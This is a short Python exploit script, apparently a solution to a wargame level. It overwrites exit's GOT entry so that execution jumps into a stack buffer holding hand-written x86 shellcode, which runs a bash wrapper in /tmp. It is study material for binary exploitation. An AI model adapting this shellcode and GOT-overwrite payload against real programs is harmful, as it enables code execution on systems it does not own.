#!/usr/bin/python

"""
exploit idea:
at address 0x080482f2 there is the value 0x08049734 which is exit@.got.plt
we write lpp = 0x080482f2 -> 0x08049734 = exit@.got.plt
then when we do **lpp = &buf
we are now going to return to the buffer
the buffer is filled with our shellcode since there is no NX

create a directory /tmp/myLvl4Sol
in said directory, create a wrapper around bash, call it wr.

"""

shellcode = (
  "\x6a\x72"              
  "\x68\x6f\x6c\x2f\x77"
  "\x68\x76\x6c\x34\x53"
  "\x68\x2f\x6d\x79\x4c"
  "\x68\x2f\x74\x6d\x70"
  "\x89\xe3"
  "\x31\xc9"
  "\x31\xd2"
  # "\xb8\x0b\x00\x00\x00" this is mov eax, 11 but it has null bytes which messes up the shellcode hence the change
  "\x31\xc0"
  "\x83\xf0\x0b"
  "\xcd\x80"
)

import struct
import string


BUFPAD = 132

chars = string.lowercase + string.uppercase

buf = shellcode[:]
# buf = ""

i = 0

while len(buf) < BUFPAD:
    buf += chars[i]*4
    i += 1

buf = buf[:BUFPAD]
lpp = struct.pack("I", 0x080482f2)          # lpp = &exit@.got.plt

exp = buf + lpp


print exp

"""
shellcode assembly in file shellcode.asm
"""
